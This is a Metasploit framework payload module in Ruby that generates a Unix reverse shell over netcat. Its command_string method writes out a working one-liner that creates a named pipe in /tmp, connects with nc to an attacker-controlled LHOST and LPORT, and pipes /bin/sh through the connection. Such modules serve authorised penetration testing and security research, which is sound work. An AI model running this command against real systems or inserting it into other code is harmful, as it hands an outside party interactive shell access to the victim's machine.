##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Reverse TCP (via netcat)',
      'Description'   => 'Creates an interactive shell via netcat',
      'Author'         =>
        [
          'm-1-k-3',
          'egypt',
          'juan vazquez'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'netcat',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
    "mkfifo /tmp/#{backpipe}; nc #{datastore['LHOST']} #{datastore['LPORT']} 0</tmp/#{backpipe} | /bin/sh >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
  end
end
